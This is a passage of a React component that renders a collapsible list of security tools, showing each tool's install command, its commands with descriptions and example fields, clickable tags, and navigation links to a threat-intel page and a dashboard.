                <span style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '8px', color: '#2a4a2a', padding: '2px 8px', border: '1px solid #1a2e1e', borderRadius: '2px', letterSpacing: '0.1em' }}>{tool.category}</span>
                <span style={{ color: color, fontSize: '10px', opacity: 0.6 }}>{isOpen ? '▼' : '▶'}</span>
              </div>

              {/* Expanded commands */}
              {isOpen && (
                <div style={{ background: '#080c0a', borderTop: '1px solid #1a2e1e' }}>
                  {/* Install */}
                  <div style={{ padding: '8px 16px', background: '#0a1005', borderBottom: '1px solid #1a2e1e', display: 'flex', gap: '12px', alignItems: 'center' }}>
                    <span style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '8px', color: '#2a4a2a', letterSpacing: '0.1em', flexShrink: 0 }}>INSTALL</span>
                    <code style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.72rem', color: '#5a7a5a' }}>{tool.install}</code>
                  </div>

                  {/* Commands */}
                  {cmds.map((cmd, i) => (
                    <div key={i} style={{ padding: '10px 16px', borderBottom: '1px solid #0a140a', display: 'grid', gridTemplateColumns: '1fr auto', gap: '12px', alignItems: 'start' }}>
                      <div>
                        <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.78rem', color: color, marginBottom: '3px', wordBreak: 'break-all' as const }}>{cmd.cmd}</div>
                        <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.68rem', color: '#5a7a5a' }}>{cmd.desc}</div>
                        {cmd.example && <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.65rem', color: '#2a4a2a', marginTop: '3px' }}>eg: {cmd.example}</div>}
                      </div>
                      <div style={{ display: 'flex', gap: '4px', flexWrap: 'wrap' as const, justifyContent: 'flex-end' }}>
                        {cmd.tags.map(tag => (
                          <span key={tag} onClick={(e) => { e.stopPropagation(); setTagFilter(tag) }} style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '7px', color: '#2a4a2a', padding: '1px 6px', border: '1px solid #0e1a0e', borderRadius: '2px', cursor: 'pointer', letterSpacing: '0.08em' }}>#{tag}</span>
                        ))}
                      </div>
                    </div>
                  ))}
                </div>
              )}
            </div>
          )
        })}
      </div>

      <div style={{ marginTop: '2rem', paddingTop: '1.5rem', borderTop: '1px solid #1a2e1e', display: 'flex', gap: '1rem' }}>
        <Link href="/intel" style={{ textDecoration: 'none', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.75rem', color: '#ff4136', padding: '8px 20px', border: '1px solid rgba(255,65,54,0.3)', borderRadius: '4px', background: 'rgba(255,65,54,0.05)' }}>
          THREAT INTEL →
        </Link>
        <Link href="/" style={{ textDecoration: 'none', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.75rem', color: '#5a7a5a', padding: '8px 20px', border: '1px solid #1a2e1e', borderRadius: '4px' }}>
          ← DASHBOARD
        </Link>
      </div>
    </div>
  )
}
